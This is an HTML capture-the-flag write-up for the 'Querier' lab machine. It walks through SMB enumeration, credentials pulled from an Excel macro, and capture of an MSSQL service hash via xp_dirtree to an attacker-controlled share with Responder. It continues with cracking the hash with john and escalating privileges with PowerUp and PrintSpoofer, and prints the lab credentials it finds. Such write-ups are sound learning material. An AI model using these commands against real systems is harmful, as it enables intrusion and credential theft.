@@ -1,0 +1,190 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Writeups | bokkisec</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="is-preload">
+
+		<!-- Header -->
+			<div id="header">
+
+				<div class="top">
+
+					<!-- Logo -->
+						<div id="logo">
+							<!-- <span class="image avatar48"><img src="images/avatar.jpg" alt="" /></span> -->
+							<a href="https://bokkisec.com"><span class="icon solid fa-home"></span>bokkisec</a>
+							<p style="padding-bottom: 10px;"></p>
+							<a href=""><h1 id="title">Querier</h1></a>
+						</div>
+
+					<!-- Nav -->
+						<nav id="nav">
+							<ul>
+								<li><a href="#enu" id="sec1-link"><span>Enumeration</span></a></li>
+								<li><a href="#foothold" id="sec2-link"><span>Foothold</span></a></li>
+								<li><a href="#privesc" id="sec3-link"><span>Privilege Escalation</span></a></li>
+							</ul>
+						</nav>
+
+				</div>
+
+				<div class="bottom">
+
+					<!-- Social Icons -->
+						<ul class="icons">
+							<li><a href="mailto:joshchung02@gmail.com" class="icon fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.linkedin.com/in/joshchung02/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
+							<li><a href="https://github.com/bokkisec" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+
+				</div>
+
+			</div>
+
+		<!-- Main -->
+			<div id="main">
+
+				<!-- Intro -->
+				<section id="top" class="one dark" style="background-image: url('images/medium.jpg')">
+					<div class="container">
+						<header>
+							<h2 style="text-align: center;">Querier</h2>
+							<div style="text-align: center;">Published: Apr 15, 2025</div>
+							<div style="text-align: center;"><img src="images/querier/querier.png"></div>
+						</header>
+					</div>
+				</section>
+
+				<!-- Content -->
+					<section id="enu" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Enumeration</h2>
+								</header>
+
+								<h3>Scan</h3>
+								<p>
+									Starting off with a basic <code>nmap</code> scan:
+									<pre>nmap -sC -sV -oN nmap/init.nmap 10.10.10.125</pre>
+									<img src="images/querier/enu1.png">
+								</p>
+
+								<h3>SMB</h3>
+								<p>
+									Since SMB is open, let's use <code>smbmap</code> to enumerate accessible shares:
+									<pre>smbmap -u anonymous -H 10.10.10.125</pre>
+									<img src="images/querier/enu2.png">
+								</p>
+								<p>
+									Taking a look at the non-default share "Reports", we find a share called "Currency Volume Report.xlsm". 
+									The <code>.xlsm</code> extension signifies a macro enabled Excel document, so let's take a look at the macros in the file:
+									<img src="images/querier/enu3.png">
+									Plaintext credentials! <code>reporting:PcwTWTHRwryjc$c6</code>
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="foothold" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Foothold</h2>
+								</header>
+
+								<h3>MSSQL</h3>
+								<p>
+									With our new credentials, let's try connecting to the MSSQL server we learned about from our initial scan. <br>
+									Using impacket-mssqlclient , we can log in to the SQL Server database:
+									<pre>impacket-mssqlclient -windows-auth reporting:'PcwTWTHRwryjc$c6'@10.10.10.125</pre>
+									After some looking around, there seems to be no interesting data in the database...
+								</p>
+
+								<h3>Responder</h3>
+								<p style="margin-bottom:0;">
+									One thing that is interesting is that <code>xp_dirtree</code> is capable of listing files on the Windows host.
+									We can attempt to abuse this by accessing a remote share that we control and capturing the NTLMv2 hash of the service account. <br>
+									Setting up Responder:
+									<pre>sudo responder -I tun0</pre>
+									In the MSSQL client:
+									<pre>xp_dirtree \\10.10.14.7\doesnotexist</pre>
+									<img src="images/querier/foo1.png">
+								</p>
+
+								<h3>Password Cracking</h3>
+								<p>
+									After putting the hash into a file (e.g. "mssql.hash"), we can crack it using the tool <code>john</code> with the wordlist <code>rockyou.txt</code>
+									<pre>john mssql.hash --wordlist=/usr/share/wordlist/rockyou.txt</pre>
+									<img src="images/querier/foo2.png">
+									We have successfully recovered valid credentials for the service account! <code>mssql-svc:corporate568</code>
+								</p>
+
+								<h3>Command Execution</h3>
+								<p>
+									We can use these credentials to log in to the database again, but now we can run <code>xp_cmdshell</code> and get a reverse shell of choice.
+								</p>
+
+							</div>
+						</div>
+					</section>
+
+					<section id="privesc" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Privilege Escalation</h2>
+								</header>
+
+								<h3>Power Up</h3>
+								<p>
+									To look for some quick Privilege Escalation opportunities, let's run <code>PowerUp.ps1</code>
+									<pre>. .\PowerUp.ps1
+Invoke-AllChecks</pre>
+									<img src="images/querier/pe1.png">
+									The script found credentials in a cached "Group Policy Preference" (GPP) file, and automatically decrypted the password for us! <code>Administrator:MyUnclesAreMarioAndLuigi!!1!</code>
+								</p>
+
+								<h3>Alternate: Privilege Abuse</h3>
+								<p>
+									The script also pointed out that our user has the <code>SeImpersonatePrivilege</code>. 
+									This is common for a service account, and it is also a common Privilege Escalation vector.
+									There are many exploits that work here, <code>PrintSpoofer.exe</code> being one of them.
+									<pre>.\PrintSpoofer.exe -c "command"</pre>
+									After getting an administrative shell, here's a fun way to grab both flags:
+									<pre>gci -recurse -erroraction SielntlyContinue -Path C:\Users -force | ?{$_.Name -eq "user.txt" -or $_.Name -eq "root.txt"} | %{Write-Host "$($_.Name):";gc $_.FullName}</pre>
+									<img src="images/querier/pe2.png">
+								</p>
+
+							</div>
+						</div>
+					</section>
+			</div>
+
+		<!-- Footer -->
+			<div id="footer">
+
+				<!-- Copyright -->
+					<ul class="copyright">
+						<li>&copy; 2025 Joshua Chung</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+					</ul>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
